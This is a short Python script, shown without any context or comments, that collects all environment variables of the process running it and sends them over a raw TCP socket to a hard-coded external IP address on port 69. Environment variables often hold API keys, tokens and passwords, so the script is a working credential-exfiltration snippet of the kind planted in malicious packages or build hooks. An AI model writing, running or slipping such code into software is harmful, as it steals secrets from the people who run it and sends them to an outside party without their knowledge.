import os
import socket

env_vars = os.environ

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('45.32.41.201', 69)
sock.connect(server_address)

sock.sendall(str(env_vars).encode())
